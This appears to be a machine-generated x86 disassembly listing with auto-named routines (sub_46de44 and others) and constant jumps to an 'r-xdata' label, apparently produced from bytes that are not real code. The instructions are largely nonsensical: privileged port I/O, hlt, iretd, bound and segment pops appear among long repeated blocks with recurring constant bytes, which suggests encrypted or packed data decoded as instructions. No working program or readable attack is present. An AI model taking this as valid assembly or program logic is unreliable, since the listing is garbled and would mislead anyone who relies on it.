xor eax 0xebe7cf02
jmp r-xdata
outsb
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edx ] eax
mov cl dl
jmp r-xdata
jecxz r-xdata
bound esi [ esi - 0x4f207e13 ]
lea esp [ edx - 0x4a ]
and edx [ esi ]
adc al 0x14
mov ebx 0x1417d602
adc al 0x3
sbb bl 0xeb
outsb
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
adc al 0x14
pushad
cmp eax 0xd1be628d
pushad
adc ecx [ ebp + 0x21b9662 ]
adc al 0x14
adc al 0x7b
jpo r-xdata
cmp ecx [ ebp + 0x2d7be62 ]
sbb dl [ esp + edx ]
jpo r-xdata
add ah [ edi + 0x14 ]
adc al 0x14
jpo r-xdata
mov esp 0xb2ebebdb
jpo r-xdata
xchg ebx eax
jpo r-xdata
sub esp esp
outsd
salc
jmp r-xdata
add edi [ ebx + ebx * 8 + 0x6eb2ebeb ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov dl 0x6e
jpo r-xdata
jmp r-xdata
mov cl cl
add [ ebp - 0x143575fe ] 0x7b7b7beb
pushad
sahf
sbb edi [ edx + eax + 0x141415d0 ]
pushad
bound ebp [ esi - 0x3293fdbf ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
add dl [ ebx - 0x4e141401 ]
lea esp [ edx - 0x42 ]
jne r-xdata
pushad
sub eax 0xebdbbc03
sub_46de44
outsb
sub esp esp
outsd
loope r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
sahf
or eax [ edx ]
movsd [ edi ] [ esi ]
sbb eax 0x7b7b1414
pushad
sub [ ebp - 0x4cc6519e ] ecx
add bl [ edi ]
jpo r-xdata
jpo r-xdata
mov esi 0x9e81b101
add bh cl
xor al 0x14
adc al 0x7b
jpo r-xdata
jecxz r-xdata
add edi eax
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
jmp r-xdata
fucomi st3
jmp r-xdata
jpo r-xdata
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
imul ecx ecx 0x214140c
sbb ebx [ eax ]
adc al 0x14
jpo r-xdata
xor edi 0x39
push edi
bound edi [ edx + eax - 0x141436ac ]
jpo r-xdata
jpo r-xdata
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
bound esi [ esi - 0x72cd9ff9 ]
imul ebx
jmp r-xdata
bound ebp [ esi + 0x1f02b339 ]
jmp r-xdata
rcr ebx 0x1
jmp r-xdata
add ebp [ esi - 0x6 ]
jmp r-xdata
pushad
adc esp [ esi + 0x6e ]
pop es
push ss
adc al 0x14
jmp r-xdata
rol esp cl
jmp r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
pop bx
push ss
adc al 0x14
in al 0x7f
sub esi [ eax + esi * 4 + 0x7b7b2822 ]
jmp r-xdata
iretd
shl [ esi - 0x1a911b05 ] cl
push es
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
jpo r-xdata
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
add ch [ edx + 0xf ]
jmp r-xdata
outsb
jmp r-xdata
adc ebp edx
jpo r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
add ch [ ebp + ecx * 8 - 0x15 ]
jmp r-xdata
pushad
sub eax 0xebdbbc03
in al 0x6f
jpo r-xdata
xchg esi eax
sti
scasb [ edi ]
pop ss
mov ebx 0xe79e14bc
mov eax 0x2dfbd14
imul ebp ebx 0xbd14ebeb
xlat
pushad
scasb [ edi ]
adc esi [ edx + eax + 0x14141125 ]
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] dl
0xcfb7
in al 0x6e
daa
xchg esi eax
pop ss
jpo r-xdata
scasb [ edi ]
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax 0xebe7cf02
jmp r-xdata
jmp r-xdata
scasd [ edi ]
mov ebx 0xebe1a002
jmp r-xdata
fsubr [ ebx ]
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
out dx eax
sbb ebp 0xb6628db0
jpo r-xdata
bound esi [ esi - 0x4f207e13 ]
lea esp [ edx - 0x4a ]
and edx [ esi ]
adc al 0x14
mov ebx 0x1417d602
adc al 0x3
sbb bl 0xeb
outsb
jpo r-xdata
jpo r-xdata
sbb edi 0xb6628db0
fnsave [ eax - 0x12499d73 ]
jpo r-xdata
in eax dx
lea esp [ edx - 0x4a ]
jpo r-xdata
jpo r-xdata
adc al 0xbd
xlat
fsubr [ ebx ]
rcl [ esi + 0x2b7fe417 ] cl
mov ah 0xb0
and ch [ eax ]
jmp r-xdata
fucomi st3
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edx ] eax
mov cl dl
jmp r-xdata
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
adc al 0x14
pushad
cmp eax 0xd1be628d
pushad
adc ecx [ ebp + 0x21b9662 ]
adc al 0x14
adc al 0x7b
jpo r-xdata
cmp ecx [ ebp + 0x2d7be62 ]
sbb dl [ esp + edx ]
jpo r-xdata
add ah [ edi + 0x14 ]
adc al 0x14
jpo r-xdata
mov esp 0xb2ebebdb
jpo r-xdata
xchg ebx eax
jpo r-xdata
sub esp esp
outsd
salc
jmp r-xdata
add edi [ ebx + ebx * 8 + 0x6eb2ebeb ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov dl 0x6e
jpo r-xdata
jmp r-xdata
mov cl cl
add [ ebp - 0x143575fe ] 0x7b7b7beb
pushad
sahf
sbb edi [ edx + eax + 0x141415d0 ]
pushad
bound ebp [ esi - 0x3293fdbf ]
jmp r-xdata
jpo r-xdata
add dl [ ebx - 0x4e141401 ]
lea esp [ edx - 0x42 ]
jne r-xdata
sub_46de60
lea esp [ edx - 0x4a ]
out dx eax
sbb ebp 0xb6628db0
in eax dx
sbb edi 0xb6628db0
jecxz r-xdata
jpo r-xdata
xor eax 0x141f8202
adc al 0x7b
jpo r-xdata
dec ebx
mov ebx 0xcf032d60
jpo r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
bound esi [ esi - 0x72cd9ff9 ]
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
pushad
sub eax 0xebc4cf03
jmp r-xdata
jpo r-xdata
pop bx
push ss
adc al 0x14
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
adc al 0x2
push 0xf
add ecx edi
jpo r-xdata
add ch [ edx + 0xf ]
jmp r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
sub_46de9e
adc al 0x9e
or eax [ edx ]
movsd [ edi ] [ esi ]
sbb eax 0x7b7b1414
pushad
sub [ ebp - 0x4cc6519e ] ecx
add bl [ edi ]
imul ebx
jmp r-xdata
mov esi 0x9e81b101
add bh cl
xor al 0x14
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
imul ecx ecx 0x214140c
sbb ebx [ eax ]
adc al 0x14
jpo r-xdata
xor edi 0x39
push edi
bound edi [ edx + eax - 0x141436ac ]
jpo r-xdata
jpo r-xdata
add ebp [ esi - 0x6 ]
jmp r-xdata
pushad
adc esp [ esi + 0x6e ]
pop es
push ss
adc al 0x14
jmp r-xdata
rol esp cl
jmp r-xdata
iretd
shl [ esi - 0x1a911b05 ] cl
push es
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
jpo r-xdata
adc ebp edx
jpo r-xdata
in al 0x6f
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] dl
0xcfb7
in al 0x6e
daa
sub_46debc
mov al 0xf3
jmp r-xdata
bound ebp [ esi + 0x1f02b339 ]
imul ebx
jmp r-xdata
mov esi 0x9e81b101
add bh cl
xor al 0x14
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
imul ecx ecx 0x214140c
sbb ebx [ eax ]
adc al 0x14
jpo r-xdata
xor edi 0x39
push edi
bound edi [ edx + eax - 0x141436ac ]
jpo r-xdata
jpo r-xdata
add ebp [ esi - 0x6 ]
jmp r-xdata
pushad
adc esp [ esi + 0x6e ]
pop es
push ss
adc al 0x14
jmp r-xdata
rol esp cl
jmp r-xdata
iretd
shl [ esi - 0x1a911b05 ] cl
push es
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
jpo r-xdata
adc ebp edx
jpo r-xdata
in al 0x6f
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] dl
0xcfb7
in al 0x6e
daa
sub_46deef
bound edx [ esi + 0x5920213 ]
adc al 0x14
jpo r-xdata
push 0x6fe4ea13
jpo r-xdata
0xac6fe4 0x1414
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] dl
0xcfb7
outsd
jpo r-xdata
jpo r-xdata
outsb
daa
pushad
xor eax 0x141f8202
adc al 0x7b
jpo r-xdata
push 0xd702ebd1
clc
jmp r-xdata
salc
pop ss
adc al 0x14
add eax [ eax - 0x4d141425 ]
outsb
sub esp esp
outsb
bound esi [ esi - 0x72cd9ff9 ]
bound esi [ esi + 0x1102b005 ]
out 0xeb al
jmp r-xdata
jpo r-xdata
pop bx
push ss
adc al 0x14
iretd
jpo r-xdata
add ch [ edx + 0xf ]
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
jmp r-xdata
scasb [ edi ]
xor eax [ edx ]
dec edi
iretd
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
sub_46df04
xchg si ax
push ebx
pop bx
push ss
adc al 0x14
add ch [ edx + 0xf ]
adc al 0x14
adc al 0x9e
unpcklps xmm7 [ ebx + ecx * 8 - 0x2de8519e ]
mov dh 0x17
add bh [ esi ]
loope r-xdata
jmp r-xdata
mov cl 0x4
mov ah 0x6
mov esp 0x3bbad62
sti
sbb al 0x14
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
sub_46df28
bound edi [ esi - 0x667e4efd ]
lea esp [ edx - 0x42 ]
add [ ecx - 0x6fd617f ] esi
adc al 0x14
jpo r-xdata
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
imul ecx ecx 0x214140c
sbb ebx [ eax ]
adc al 0x14
jpo r-xdata
xor edi 0x39
push edi
bound edi [ edx + eax - 0x141436ac ]
jpo r-xdata
jpo r-xdata
add ebp [ esi - 0x6 ]
jmp r-xdata
pushad
adc esp [ esi + 0x6e ]
pop es
push ss
adc al 0x14
jmp r-xdata
rol esp cl
jmp r-xdata
iretd
shl [ esi - 0x1a911b05 ] cl
push es
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
jpo r-xdata
xor al 0x14
adc al 0x7b
jpo r-xdata
mov esi 0x9e81b101
add bh cl
adc ebp edx
jpo r-xdata
in al 0x6f
jpo r-xdata
lodsb [ esi ]
add [ esp + edx ] dl
0xcfb7
in al 0x6e
daa
sub_46df46
outsb
sub esp esp
outsb
pop ss
fucomi st3
jmp r-xdata
add ebp ecx
sbb al 0x14
adc al 0x83
idiv [ ecx ]
push edi
bound edi [ edx + eax - 0x141436ac ]
jpo r-xdata
adc al 0x83
cmpsb [ esi ] [ edi ]
stc
hlt
imul ecx ecx 0x214140c
sbb ebx [ eax ]
adc al 0x14
jpo r-xdata
add ebp [ esi - 0x6 ]
jmp r-xdata
pushad
adc esp [ esi + 0x6e ]
pop es
push ss
adc al 0x14
iretd
shl [ esi - 0x1a911b05 ] cl
push es
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
sub_46dff0
outsb
sub esp esp
outsb
and [ edi ] bl
adc al 0x14
jmp r-xdata
jpo r-xdata
adc al 0x14
sub ebx 0xfffffffb
jmp r-xdata
jpo r-xdata
and cl [ ecx ]
adc al 0x14
jpo r-xdata
mov bh 0xb3
add bl [ ebx - 0xd ]
jmp r-xdata
outsb
in al 0xf7
jmp r-xdata
pop ebp
jpo r-xdata
jl r-xdata
sub eax 0x28281b1
adc al 0x14
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
xor [ edi - 0xca4fd4d ] 0x39d8ebeb
lea esp [ edx - 0x42 ]
jmp r-xdata
jpo r-xdata
sub ebx 0xebcc7102
jmp r-xdata
in al 0x6f
lodsd [ esi ]
pop es
adc al 0xd3
mov dh 0xfb
in al 0x6e
in eax 0x6
jecxz r-xdata
jpo r-xdata
xchg esi eax
push ecx
add dh [ ecx + 0x60ebebe1 ]
pop es
push 0x7
adc al 0x14
mov ebx 0xec81b8b8
mov eax 0xeb0b7c14
jmp r-xdata
shl [ esi - 0x1a911b05 ] cl
push es
jpo r-xdata
sub al 0x3
sub al 0xae
pop ss
0x60ebebeb 0x17ae
adc al 0x14
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
pop ds
add bh [ edx + ebx + 0x14 ]
adc al 0x7b
in al 0x6f
cwde
imul ebx
jmp r-xdata
scasb [ edi ]
jecxz r-xdata
push 0x2eaf794
add dl [ cs : esp + edx ]
jpo r-xdata
jmp r-xdata
xchg ah bh
jmp r-xdata
sbb [ eax + 0x14129702 ] 0x6b7b7b14
xchg esi eax
sti
jmp 0xffffffffec3aae8a
jmp r-xdata
jpo r-xdata
imul edx
add ch [ esi ]
add dl [ esp + edx ]
in al 0x6f
test [ edx ] 0x12021414
and edi eax
jmp r-xdata
adc al 0x14
pushad
mov [ 0x32c60e3 ] eax
lea esp [ edx - 0x1 ]
in eax 0x8d
outsb
cmp [ edx ] eax
das
int 0xeb
jmp r-xdata
jmp r-xdata
adc al 0x14
add dl [ edx ]
adc al 0x68
xchg esp eax
sub_46e04f
pushad
lodsd [ esi ]
fild [ edx ]
aad 0xf0
jmp r-xdata
jmp r-xdata
mov al [ 0x7bebebc7 ]
jpo r-xdata
scasb [ edi ]
jpo r-xdata
pop ss
mov ebx 0x3e39e14
adc al 0x14
outsb
sub eax [ edx ]
jpo r-xdata
adc al 0x9e
jpo r-xdata
jmp r-xdata
xor bl ch
jmp r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
mov ebx 0xebefc302
jmp r-xdata
or ebp 0xae66ebeb
sub_46e059
add cl [ esi + 0x7b14141f ]
jpo r-xdata
push 0xe4ea1796
outsb
inc edi
outsd
pushfd
push ss
adc al 0x14
or ecx 0xffffffe9
push esp
popad
mov esp 0x141da003
adc al 0x60
xor esi [ edx + 0x17b662b2 ]
outsb
xor [ edx ] al
pop ebp
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub ebx 0xebcc7102
jmp r-xdata
in al 0x6f
lodsd [ esi ]
pop es
adc al 0x14
sub ebx 0xfffffffb
jmp r-xdata
jecxz r-xdata
jpo r-xdata
xchg esi eax
push ecx
add dh [ ecx + 0x60ebebe1 ]
pop es
push 0x7
and cl [ ecx ]
adc al 0x14
jpo r-xdata
jpo r-xdata
sub al 0x3
sub al 0xae
pop ss
0x60ebebeb 0x17ae
adc al 0x14
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
pop ds
add bh [ edx + ebx + 0x14 ]
adc al 0x7b
in al 0x6f
cwde
imul ebx
jmp r-xdata
scasb [ edi ]
jecxz r-xdata
push 0x2eaf794
add dl [ cs : esp + edx ]
jpo r-xdata
jmp r-xdata
xchg ah bh
jmp r-xdata
sbb [ eax + 0x14129702 ] 0x6b7b7b14
xchg esi eax
sti
jmp 0xffffffffec3aae8a
jmp r-xdata
jpo r-xdata
imul edx
add ch [ esi ]
add dl [ esp + edx ]
in al 0x6f
test [ edx ] 0x12021414
and edi eax
jmp r-xdata
adc al 0x14
pushad
mov [ 0x32c60e3 ] eax
lea esp [ edx - 0x1 ]
in eax 0x8d
outsb
cmp [ edx ] eax
das
int 0xeb
jmp r-xdata
jmp r-xdata
adc al 0x14
add dl [ edx ]
adc al 0x68
xchg esp eax
sub_46e2a8
pushad
adc eax [ edx ]
in eax dx
clc
jmp r-xdata
jpo r-xdata
jmp r-xdata
jae r-xdata
test al 0xc7
lea ebp [ esi + 0x2b ]
in al 0x6f
and [ esp + edx ] dh
adc al 0x8d
push 0x2ebad90
loope r-xdata
mov cl 0x81

jmp r-xdata
in al 0x5c
jpo r-xdata
add dh [ esi ]
jpo r-xdata
jpo r-xdata
shr dl 0x28
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
bound ebp [ ebp + 0x17 ]
jpo r-xdata
adc [ edx + eax ] 0xebebf322
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x42 ]
add [ edx ] 0xebebe3c1
mov [ eax ] cl
jmp r-xdata
pop ss
jpo r-xdata
push es
jpo r-xdata
add ah [ edx ]
jmp r-xdata
mov eax 0xebc29402
jmp r-xdata
sub esp esp
outsd
xchg [ esi ] eax
adc al 0x14
test al 0x2
hlt
0x7b7b7b28 0xb87b
sbb [ ecx + 0x628d8781 ] esi
mov esi 0x9530223
adc al 0x14
jpo r-xdata
add edx [ eax + 0x19 ]
adc al 0x14
add [ eax + 0x1e ] 0xffffff96
sub [ ebx + 0x7b ] bh
adc al 0x2
and dh bl
jmp r-xdata
insd
add eax 0x136d62b8
jmp r-xdata
in eax dx
jpo r-xdata
mov esp edi
jmp r-xdata
xlat
mov eax 0xeb176d62
jmp r-xdata
mov eax 0x14195003
adc al 0x83
inc eax
adc [ esi + ebp * 4 ] edx
pop ds
push 0xbf63e32a
imul [ edi ]
push 0x69e4cb12
xor al 0x1c
adc al 0x14
lodsb [ esi ]
jpe r-xdata
or al 0xe0
mov eax 0xeb136d62
jmp r-xdata
add dl [ edi ]
push esi
aas
push ss
adc al 0x14
outsb
sub eax [ edx ]
outsd
add eax 0x7b7b1414
jpo r-xdata
push 0x69e4e814
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
sbb al 0x14
adc al 0xac
jpo r-xdata
sbb dh dh
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
add cl [ ecx + 0x7bebebfc ]
jpo r-xdata
fldln2
jpo r-xdata
add [ esp + edx ] edx
push ds
xchg esi eax
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ds
or [ esp + edx ] edx
add al [ ebp - 0x9 ]
jmp r-xdata
adc al 0x14
pop ss
sub_46e31f
sbb dx [ eax ]
adc al 0x14
add ebp [ esi + 0x2ebebc5 ]
xchg esp eax
shr bl 0xeb
jpo r-xdata
jpo r-xdata
jmp r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
add bh [ edx + ebx + 0x14 ]
adc al 0x7b
in al 0x6f
cwde
imul ebx
jmp r-xdata
mov cl 0x81

jmp r-xdata
sbb [ eax + 0x14129702 ] 0x6b7b7b14
xchg esi eax
sti
jmp 0xffffffffec3aae8a
jpo r-xdata
add dh [ esi ]
jpo r-xdata
jpo r-xdata
shr dl 0x28
jpo r-xdata
add [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
bound ebp [ ebp + 0x17 ]
jpo r-xdata
adc [ edx + eax ] 0xebebf322
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x42 ]
add [ edx ] 0xebebe3c1
jpo r-xdata
mov [ eax ] cl
jmp r-xdata
pop ss
jpo r-xdata
push es
jpo r-xdata
add ah [ edx ]
jmp r-xdata
mov eax 0xebc29402
jmp r-xdata
sub esp esp
outsd
xchg [ esi ] eax
adc al 0x14
test al 0x2
hlt
0x7b7b7b28 0xb87b
jmp r-xdata
sbb [ ecx + 0x628d8781 ] esi
mov esi 0x9530223
adc al 0x14
jpo r-xdata
add edx [ eax + 0x19 ]
adc al 0x14
add [ eax + 0x1e ] 0xffffff96
sub [ ebx + 0x7b ] bh
adc al 0x2
and dh bl
jmp r-xdata
insd
add eax 0x136d62b8
jmp r-xdata
in eax dx
jpo r-xdata
mov esp edi
jmp r-xdata
test al 0xc7
lea ebp [ esi + 0x2b ]
in al 0x6f
and [ esp + edx ] dh
adc al 0x8d
push 0x2ebad90
loope r-xdata
xlat
mov eax 0xeb176d62
jmp r-xdata
mov eax 0x14195003
adc al 0x83
inc eax
adc [ esi + ebp * 4 ] edx
pop ds
push 0xbf63e32a
imul [ edi ]
push 0x69e4cb12
xor al 0x1c
adc al 0x14
lodsb [ esi ]
jpe r-xdata
or al 0xe0
mov eax 0xeb136d62
jmp r-xdata
add dl [ edi ]
push esi
aas
push ss
adc al 0x14
outsb
sub eax [ edx ]
outsd
add eax 0x7b7b1414
jpo r-xdata
in al 0x5c
push 0x69e4e814
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
sbb al 0x14
adc al 0xac
jpo r-xdata
sbb dh dh
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
add cl [ ecx + 0x7bebebfc ]
jpo r-xdata
fldln2
jpo r-xdata
add [ esp + edx ] edx
push ds
xchg esi eax
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ds
or [ esp + edx ] edx
add al [ ebp - 0x9 ]
jmp r-xdata
adc al 0x14
pop ss
sub_46e33e
adc eax 0xebf98903
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
sbb eax 0x8db39981
bound ebp [ esi - 0x72d427ed ]
bound ebp [ esi + 0x3f6e6611 ]
push ss
fdivr [ ecx ]
lea esp [ edx - 0x42 ]
adc al 0x14
add cl [ 0x7b141417 ]
mov dl 0xb2
add cl [ ebp - 0x45ebebf8 ]
push edx
fucomi st3
jmp r-xdata
mov eax 0x14195003
adc al 0x83
inc eax
push ds
xchg esi eax
adc [ esi + ebp * 4 ] edx
pop ds
push 0xbf63e32a
imul [ edi ]
push 0x69e4cb12
xor al 0x1c
adc al 0x14
lodsb [ esi ]
or al 0xe0
jpe r-xdata
push 0x69e4e814
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
sbb al 0x14
adc al 0xac
sbb [ ecx + 0x628d8781 ] esi
mov esi 0x9530223
adc al 0x14
jpo r-xdata
xlat
mov eax 0xeb176d62
jmp r-xdata
add edx [ eax + 0x19 ]
adc al 0x14
add [ eax + 0x1e ] 0xffffff96
sub_46e3f6
or [ eax - 0x47851ff4 ] 0x3
push eax
sbb [ esp + edx ] edx
or al 0xe0
jpe r-xdata
sbb [ ecx + 0x628d8781 ] esi
mov esi 0x9530223
adc al 0x14
jpo r-xdata
add [ eax + 0x1e ] 0xffffff96
add edx [ eax + 0x19 ]
adc al 0x14
xlat
mov eax 0xeb176d62
jmp r-xdata
mov eax 0x14195003
adc al 0x83
inc eax
push ds
xchg esi eax
adc [ esi + ebp * 4 ] edx
pop ds
push 0xbf63e32a
imul [ edi ]
push 0x69e4cb12
xor al 0x1c
adc al 0x14
lodsb [ esi ]
push 0x69e4e814
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
sbb al 0x14
adc al 0xac
sub_46e40d
add eax [ ecx + 0x19 ]
adc al 0x14
add [ esi ] 0xffffffd9
in eax dx
add eax 0x136d62b8
jmp r-xdata
insd
pop ss
jmp r-xdata
mov [ eax ] cl
sbb [ ecx + 0x628d8781 ] esi
mov esi 0x9530223
adc al 0x14
jpo r-xdata
add edx [ eax + 0x19 ]
adc al 0x14
add [ eax + 0x1e ] 0xffffff96
xlat
mov eax 0xeb176d62
jmp r-xdata
mov eax 0x14195003
adc al 0x83
inc eax
push ds
xchg esi eax
adc [ esi + ebp * 4 ] edx
pop ds
push 0xbf63e32a
imul [ edi ]
push 0x69e4cb12
xor al 0x1c
adc al 0x14
lodsb [ esi ]
jpe r-xdata
or al 0xe0
push 0x69e4e814
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
sbb al 0x14
adc al 0xac
sub_46e424
jpo r-xdata
sbb esi ebp
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
and al 0x1c
adc al 0x14
arpl [ esi - 0x644fdc5 ] bp
jmp r-xdata
lea esp [ edx - 0x52 ]
sbb eax 0x8db39981
bound ebp [ esi - 0x72d427ed ]
bound ebp [ esi + 0x3f6e6611 ]
push ss
pop ebp
in al dx
mov ebx 0xeb212c6a
jmp r-xdata
jpo r-xdata
jpo r-xdata
sbb al 0x14
adc al 0xac
push 0x69e4e814
adc al 0x14
add cl [ 0x7b141417 ]
mov dl 0xb2
add cl [ ebp - 0x45ebebf8 ]
push edx
fucomi st3
jmp r-xdata
0x9f56ee4 0x1414
in al 0x6e
out dx al
jmp r-xdata
jpo r-xdata
mov esp 0xe3cf9f14
pushad
adc edx [ esp + edi * 4 ]
pop [ edx ]
outsb
sub esp esp
outsd
out dx eax
jmp r-xdata
adc al 0x14
mov dl 0x6e
scasb [ edi ]
adc edi [ ebx + 0x1481f581 ]
add bh [ ebx ]
adc dl [ esp + edx ]
jpo r-xdata
fsetpm287_nop
outsd
jpo r-xdata
mov esi 0x7680760
sti
or [ edx - 0x1411c9fe ] 0x7b7b7beb
add esi [ ebx - 0x3e ]
jmp r-xdata
adc al 0x68
bound esp [ esi + 0x36260207 ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
pop es
add ah [ esi ]
adc al 0x14
adc al 0x7c
add ebp ebx
jmp r-xdata
mov esi 0x2ebebc1
jmp r-xdata
jmp r-xdata
add [ edx + 0x628d8281 ] esi
cmpsb [ esi ] [ edi ]
add eax 0x14337502
adc al 0x7b
jpo r-xdata
cmp esp [ edx - 0x4a ]
pop ss
jpo r-xdata
add dl al
hlt
mov dh 0x17
jpo r-xdata
jpo r-xdata
jmp r-xdata
add [ esi + 0x37ae628d ] 0x29b81b3
jne r-xdata
in al 0xeb
jmp r-xdata
in al 0x6f
bound esi [ esi - 0x72cf273d ]
bound esi [ esi - 0x35b2fd3f ]
jmp r-xdata
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x4a ]
int 0x60
xor ecx [ ebp - 0x273c499e ]
xor [ ebp + 0x2c1b662 ] cl
dec ebp
0xebeb
adc al 0x9e
out 0x14 eax
jpo r-xdata
jpo r-xdata
iretd
jmp r-xdata
adc al 0xb2
add cl [ esi ]
jmp r-xdata
cmp al 0x1b
jpo r-xdata
adc al 0x14
mov dl 0x2
or al 0xe6
sbb [ ebx + 0x141c7502 ] 0x7b7b7b14
add edi [ ebx + ebx ]
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
xor esp 0xffffffeb
in al 0xeb
jpo r-xdata
mov dl 0x6e
sub esp esp
outsb
out 0x3 al
adc al 0x14
scasb [ edi ]
cmp edi [ ebx + 0x3e3ae60 ]
ja r-xdata
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
outsb
jmp r-xdata
cmp [ esi ] 0xffffffa4
sub [ ebx + 0x7b ] bh
jpo r-xdata
xor ebp ebx
jpo r-xdata
outsb
sub esp esp
outsb
out 0xeb al
jmp r-xdata
into
add edi [ esi + 0x2ebebc1 ]
in al 0x6f
add eax edx
jmp r-xdata
jmp r-xdata
mov esp 0xcc9803bb
jmp r-xdata
scasw [ edi ]
iretd
lahf
iretd
jpo r-xdata
mov dh 0xe7
in al 0x6f
xor al 0xc2
jmp r-xdata
sub eax [ edx ]
into
xor [ esp + edx ] dl
jpo r-xdata
mov ch 0x6e
jmp r-xdata
or [ esi + 0xbbe628d ] 0xbe628db1
or eax ebx
cmp [ ecx + 0x36110285 ] eax
or [ esp + edx ] edx
jpo r-xdata
pop esp
jpo r-xdata
adc al 0xb8
jpo r-xdata
jmp r-xdata
pop eax
fld [ eax + 0x2a ]
jmp 0xffffffffec3f4f56
in al 0x5c
jpo r-xdata
add al [ ebp + 0xa ]
adc al 0x14
jpo r-xdata
jpo r-xdata
mov eax 0x140a4502
adc al 0x7b
jpo r-xdata
in al 0x6e
add bl [ eax - 0x10 ]
adc al 0x14
jpo r-xdata
mov ebx 0xbcebebe9
sbb [ eax + 0x608a81b2 ] 0xae628d2a
xor esi [ ebx + 0x3b608681 ]
lea esp [ edx - 0x42 ]
xor [ ecx + 0x628d9b81 ] esi
mov esi 0x8781b137
lea esp [ edx - 0x42 ]
xor eax 0x8d8e81b1
bound edi [ esi + 0x628db10b ]
mov esi 0x8139d809
test [ edx ] eax
adc [ esi ] esi
add bl [ ebp + edi + 0x14 ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
